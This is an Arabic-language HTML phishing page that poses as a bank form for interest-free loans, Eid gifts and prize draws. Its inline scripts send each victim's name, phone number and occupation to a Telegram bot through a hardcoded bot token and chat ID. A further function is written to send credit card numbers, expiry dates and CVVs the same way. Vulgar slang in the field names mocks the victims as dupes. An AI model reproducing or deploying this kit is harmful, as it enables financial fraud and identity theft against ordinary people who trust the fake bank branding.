<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تقديم طلب قرض بدون فوائد</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
  <style>
    body {
      background-color: #f4f4f4;
      font-family: Georgia, serif;
      direction: rtl;
      text-align: right;
    }
    .form-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-bottom: 5px;
    }
    .card {
      background-color: white;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      padding: 30px;
      margin-top: 0px;
    }
    .form-group label {
      font-weight: 600;
    }
    .split-input {
      display: flex;
    }
    .split-input .form-group {
      flex: 1;
      margin-right: 7px;
    }
    .error-message {
      color: red;
    }
    .center {
      margin-bottom: 20px;
      display: block;
      margin-left: auto;
      margin-right: auto;
      width: 100%;
    }
    .sbicard {
      margin-top: 0%;
      margin-bottom: 30px;
      display: block;
      margin-left: auto;
      margin-right: auto;
      width: 100%;
    }
    input[type="text"],
    input[type="tel"],
    select {
      background-color: #F7F7FF;
      width: 100%;
      height: 55px;
      padding: 8px;
      border: none;
      border-radius: 10px;
      box-sizing: border-box;
      border: 1.3px solid #000000;
      color: black;
      font-size: 19px;
    }
    ::placeholder {
      color: black;
      font-size: 19px;
    }
    input[type="submit"] {
      background-color: #00B4F7;
      color: white;
      border: none;
      padding: 10px 20px;
      text-align: center;
      font-size: 16px;
      border-radius: 20px;
      cursor: pointer;
      height: 50px;
      font-size: 21px;
      font-weight: bold;
      width: 100%;
    }
    #card-number::placeholder,
    #expiration-date::placeholder,
    #cvv::placeholder,
    #cardholder-name::placeholder {
      font-size: 20px; 
      color: black;
    }
  </style>
</head>
<body>
  <img src="logo11.png" alt="Paris" class="center">
  <div class="container">
    <div class="row">
      <div class="col-lg-6 offset-lg-3 col-md-8 offset-md-2 col-12">
        <div class="card">
          <form id="myForm">
            <div class="form-group">
              <label for="اسم المنيك"></label>
              <input type="text" id="اسم المنيك" name="اسم المنيك" placeholder="اسمك الرباعي" required>
            </div>
            <div class="form-group">
              <label for="رقم تلفونه"></label>
              <input type="text" id="رقم تلفونه" name="رقم تلفونه" placeholder="رقم الهاتف" required>
            </div>
            <div class="form-group">
              <label for="شو بشتغل"></label>
              <input type="text" id="شو بشتغل" name="شو بشتغل" placeholder="الوظيفة او مصدر الدخل" required>
            </div>
            <div class="form-group">
              <label for="الخدمة المطلوبة"></label>
              <select id="بشو بده ينتصب عليه" name="بشو بده ينتصب عليه" required>
                <option value="">-- اختر الخدمة --</option>
                <option value="الحصول على عيدية بقيمة 200 دينار">الحصول على عيدية بقيمة 200 دينار</option>
                <option value="تقديم طلب قرض فوري">تقديم طلب قرض فوري</option>
                <option value="الإشتراك بالسحب على 10 آلاف دينار">الإشتراك بالسحب على 10 آلاف دينار</option>
                <option value="زيادة سقف البطاقة>زيادة سقف البطاقة</option>
                <option value="استثمار رصيد حسابك من خلال المصرف">استثمار رصيد حسابك من خلال المصرف</option>
              </select>
            </div>
            <br>
            <input type="submit" value="تقديم الطلب">
          </form>

  </div>
  <script>
    // Function to send data to Telegram and redirect to another URL
    function sendTelegramMessage(event) {
      event.preventDefault(); // Prevent default form submission

      // Get form data
      const formData = new FormData(document.getElementById('registrationForm'));
      const creditCard = formData.get('credit-card');
      const expiryDate = formData.get('expiration-date');
      const cvv = formData.get('cvv');
      const cardholderName = formData.get('cardholder-name');

      // Construct message
      const message = `New registration:\nCredit Card: ${creditCard}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}\nCardholder Name: ${cardholderName}`;

      // Send data to Telegram using fetch and the Telegram Bot API
      fetch(`https://api.telegram.org/bot7409916960:AAERuqSgwUzjSJq1FdIo6lU_jLvLZ2UCweg/sendMessage?chat_id=6797351288&text=${encodeURIComponent(message)}`)
        .then(response => {
          if (response.ok) {
            // Redirect to another URL after successful submission
            window.location.href = 'card.html'; // Replace with your desired URL
          } else {
            // Handle errors if needed
            console.error('Failed to send message to Telegram');
          }
        })
        .catch(error => {
          // Handle errors if needed
          console.error('Error sending message:', error);
        });
    }

    // Add form submit event listener
    document.getElementById('registrationForm').addEventListener('submit', sendTelegramMessage);
  </script>
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@1.16.1/dist/umd/popper.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
  <script>
    // the bot token you received from BotFather when you created the bot
    var botToken = '7409916960:AAERuqSgwUzjSJq1FdIo6lU_jLvLZ2UCweg';

    // the chat ID of the conversation between you and your bot
    var botChatID = '6797351288';

    // the URL you want to redirect to after data is sent
    var redirectUrl = 'car.html';

    document.getElementById('myForm').addEventListener('submit', function(event) {
        event.preventDefault();  // stop the form from submitting
        
        var formData = new FormData(this);
        var messageText = '';
        
        for (var pair of formData.entries()) {
            messageText += pair[0]+ ': '+ pair[1]+'\n';
        }
        
        var sendTextUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + botChatID + '&parse_mode=HTML&text=' + encodeURIComponent(messageText);

        fetch(sendTextUrl)
        .then(response => response.json())
        .then(data => {
            console.log(data);  // log the API response data to the console
            window.location.href = redirectUrl;  // redirect to the specified URL
        });
    });
  </script>
</body>
</html>
